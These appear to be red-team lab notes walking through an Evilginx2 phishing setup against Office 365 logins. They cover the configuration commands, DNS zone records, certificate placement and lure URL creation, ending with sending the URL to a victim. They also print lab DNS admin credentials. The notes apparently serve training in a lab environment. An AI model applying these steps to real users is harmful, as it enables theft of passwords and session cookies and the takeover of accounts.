# Initial Access - Phishing - Evilginx2

- We can use Evilginx2 (https://github.com/kgretzky/evilginx2) for phishing attacks.

- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

- It uses phishlets that are configuration files for specific target domains.
These are YAML files that specify conditions like hosts, filters, structure
of authentication cookies and credentials.

#### Starting Evilginx2

- Evilginx2 is already setup on the student VMs. We can use the following commands.
- Start evilginx2:
```
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```
- Configure the domain:
```
config domain studentx.corp
```
- Set the IP for the evilginx server:
```
config ip 172.16.x.x
```
- Use the template for Office 365:
```
phishlets hostname o365 login.studentx.corp
```
- Verify the DNS entries:
```
phishlets get-hosts o365
```

#### Setup DNS
You can access DNS Server by browsing to ```http://172.16.2.50:5380/``` from your student VM and using the following details:
```
username: admin
password: admin@123
```

- Now goto ```Zones > Add Zone``` and create zone ```Student213.corp```
- Edit Name Server and Statement of Authority and set values to your localIP
- Now add two A Records
  - ```login.login```
  - ```www```

#### next
- Copy the certificate and private key - o365.crt and o365.key from:
```C:\studentx\.evilginx\crt``` to ```C:\studentx\.evilginx\crt\login.studentx.corp```

- Enable phishlets:
```phishlets enable o365```
-  Create the phishing URL (tied to an ID):
```lures create o365```
- Get the phishing URL
```lures get-url <ID>```
- Share the URL with the victim. (For the lab, send an email using your personal email).
